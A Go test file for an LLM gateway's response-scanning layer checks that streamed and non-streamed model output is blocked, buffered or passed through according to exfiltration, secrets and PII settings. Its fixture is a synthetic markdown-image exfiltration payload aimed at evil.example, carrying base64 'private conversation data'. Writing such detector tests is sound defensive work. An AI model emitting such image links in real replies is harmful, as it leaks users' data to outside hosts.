package gateway

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/bastio-ai/bastio/internal/providers"
	"github.com/bastio-ai/bastio/internal/security"
	"github.com/bastio-ai/bastio/internal/security/detection"
)

// Synthetic markdown-image exfil payload; the query string is base64 filler.
const holdbackImageExfil = "![status](https://evil.example/p.png?d=QWxsIG9mIHRoZSB1c2VycyBwcml2YXRlIGNvbnZlcnNhdGlvbiBkYXRhIGdvZXMgaGVyZSBpbiBiYXNlNjQgZm9ybQ)"

// observeOnlyOutputProfile has every response-side step on warn/log_only.
func observeOnlyOutputProfile() security.Profile {
	p := security.DefaultProfile()
	p.PIIScanResponse = false
	p.OutputExfilStrategy = security.ActionLogOnly
	p.SecretsStrategy = security.ActionWarn
	return p
}

// countingDetector counts Detect calls so a test can prove a scan ran.
type countingDetector struct {
	inner security.Detector
	calls *atomic.Int32
}

func (d countingDetector) Name() string { return d.inner.Name() }

func (d countingDetector) Detect(ctx context.Context, content string) ([]security.Finding, error) {
	d.calls.Add(1)
	return d.inner.Detect(ctx, content)
}

// flushWriter is a concurrency-safe ResponseWriter that reports the bytes
// written since the previous Flush on a channel, one message per Flush.
type flushWriter struct {
	mu      sync.Mutex
	header  http.Header
	pending []byte
	all     []byte
	code    int
	flushes chan string
}

func newFlushWriter() *flushWriter {
	return &flushWriter{header: http.Header{}, flushes: make(chan string, 64)}
}

func (w *flushWriter) Header() http.Header { return w.header }

func (w *flushWriter) WriteHeader(code int) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.code = code
}

func (w *flushWriter) Write(b []byte) (int, error) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.pending = append(w.pending, b...)
	w.all = append(w.all, b...)
	return len(b), nil
}

func (w *flushWriter) Flush() {
	w.mu.Lock()
	chunk := string(w.pending)
	w.pending = nil
	w.mu.Unlock()
	w.flushes <- chunk
}

func (w *flushWriter) body() string {
	w.mu.Lock()
	defer w.mu.Unlock()
	return string(w.all)
}

func sseChunk(text string) string {
	content, _ := json.Marshal(text)
	return `data: {"choices":[{"index":0,"delta":{"content":` + string(content) + `}}]}` + "\n\n"
}

// (1) Streaming, exfil strategy block, every other output step observe-only:
// the exfil step alone must hold the stream back and block it.
func TestNativeStreamExfilBlockHoldsBackStream(t *testing.T) {
	t.Setenv("OPENAI_API_KEY", "openai-secret")
	stream := sseChunk("Here is the badge: ") + sseChunk(holdbackImageExfil) + "data: [DONE]\n\n"
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/event-stream")
		_, _ = w.Write([]byte(stream))
	}))
	defer server.Close()
	reg := providers.NewRegistry()
	reg.Register(providers.NewOpenAIClientWithBaseURL(server.URL))
	profile := observeOnlyOutputProfile()
	profile.OutputExfilStrategy = security.ActionBlock
	h := NewHandler(reg, nil, fullTestEngine(), &nativeTestProfile{profile: &profile}, nil, "fail-open")
	rr := httptest.NewRecorder()
	h.ChatCompletions(rr, nativeRequest("POST", "/v1/chat/completions", `{"model":"gpt-4o-mini","stream":true,"messages":[{"role":"user","content":"Show the status badge."}]}`))
	if rr.Code != http.StatusForbidden {
		t.Fatalf("status %d, want 403: %s", rr.Code, rr.Body.String())
	}
	if strings.Contains(rr.Body.String(), "QWxsIG9m") || strings.Contains(rr.Body.String(), "Here is the badge") {
		t.Fatalf("blocked stream leaked content: %s", rr.Body.String())
	}
}

// (2) Streaming with every output step on log_only/warn: chunks pass through
// unmodified and are flushed one by one, before the upstream finishes.
func TestNativeStreamObserveOnlyPassesThroughIncrementally(t *testing.T) {
	profile := observeOnlyOutputProfile()
	chunks := []string{sseChunk("Here "), sseChunk("is the badge: "), sseChunk(holdbackImageExfil), "data: [DONE]\n\n"}
	pr, pw := io.Pipe()
	resp := &http.Response{StatusCode: 200, Header: http.Header{"Content-Type": {"text/event-stream"}}, Body: pr}
	r := nativeRequest("POST", "/v1/chat/completions", "")
	r = r.WithContext(security.WithProfile(r.Context(), &profile))
	h := NewHandler(providers.NewRegistry(), nil, fullTestEngine(), nil, nil, "fail-open")
	w := newFlushWriter()
	done := make(chan string, 1)
	go func() {
		_, _, _, status := h.forwardNativeStream(w, r, resp, &nativeMetadata{})
		done <- status
	}()
	for i, chunk := range chunks {
		if _, err := pw.Write([]byte(chunk)); err != nil {
			t.Fatalf("write chunk %d: %v", i, err)
		}
		select {
		case got := <-w.flushes:
			if got != chunk {
				t.Fatalf("chunk %d forwarded as %q, want %q", i, got, chunk)
			}
		case <-time.After(2 * time.Second):
			t.Fatalf("chunk %d not flushed before upstream finished: stream was held back", i)
		}
	}
	_ = pw.Close()
	if status := <-done; status != "ok" {
		t.Fatalf("status %q, want ok", status)
	}
	if got := w.Header().Get("X-Bastio-Stream-Buffered"); got != "" {
		t.Fatalf("observe-only stream marked buffered: %q", got)
	}
	if w.body() != strings.Join(chunks, "") {
		t.Fatalf("stream changed: %q", w.body())
	}
}

// (3) Non-streaming with log_only output steps: the scan still runs and the
// response is delivered unchanged.
func TestNativeNonStreamObserveOnlyScansAndDelivers(t *testing.T) {
	profile := observeOnlyOutputProfile()
	var calls atomic.Int32
	engine := security.NewEngine(countingDetector{inner: detection.NewExfilDetector(), calls: &calls}, detection.NewSecretsDetector(), detection.NewPIIDetector())
	h := NewHandler(providers.NewRegistry(), nil, engine, nil, nil, "fail-open")
	r := nativeRequest("POST", "/v1/chat/completions", "")
	r = r.WithContext(security.WithProfile(r.Context(), &profile))
	content, _ := json.Marshal(holdbackImageExfil)
	body := []byte(`{"id":"c","choices":[{"index":0,"message":{"role":"assistant","content":` + string(content) + `}}]}`)
	out, blocked, reason := h.postProcessNativeResponse(r, body)
	if blocked {
		t.Fatalf("log_only output blocked: %s", reason)
	}
	if out != nil && string(out) != string(body) {
		t.Fatalf("log_only output rewritten: %s", out)
	}
	if calls.Load() == 0 {
		t.Fatal("exfil detector did not run on the non-streaming response")
	}
}

// Hold-back decision: enforcing output strategies buffer, observe-only ones
// do not, and PIIScanResponse keeps buffering as it did at 508074d.
func TestOutputScanCanChangeResponse(t *testing.T) {
	observe := observeOnlyOutputProfile()
	piiResp := observeOnlyOutputProfile()
	piiResp.PIIScanResponse = true
	piiResp.PIIAction = security.ActionLogOnly
	secretsMask := observeOnlyOutputProfile()
	secretsMask.SecretsStrategy = security.ActionMask
	exfilRedact := observeOnlyOutputProfile()
	exfilRedact.OutputExfilStrategy = security.ActionRedact
	piiTokenize := observeOnlyOutputProfile()
	piiTokenize.PIIScanResponse = true
	piiTokenize.PIIAction = security.ActionTokenize
	def := security.DefaultProfile()
	def.PIIScanResponse = false
	for name, tc := range map[string]struct {
		profile *security.Profile
		want    bool
	}{
		"nil":                 {nil, false},
		"observe only":        {&observe, false},
		"pii scan response":   {&piiResp, true},
		"secrets mask":        {&secretsMask, true},
		"exfil redact":        {&exfilRedact, true},
		"pii tokenize":        {&piiTokenize, true},
		"default exfil block": {&def, true},
	} {
		if got := outputScanCanChangeResponse(tc.profile); got != tc.want {
			t.Errorf("%s: got %v, want %v", name, got, tc.want)
		}
	}
}
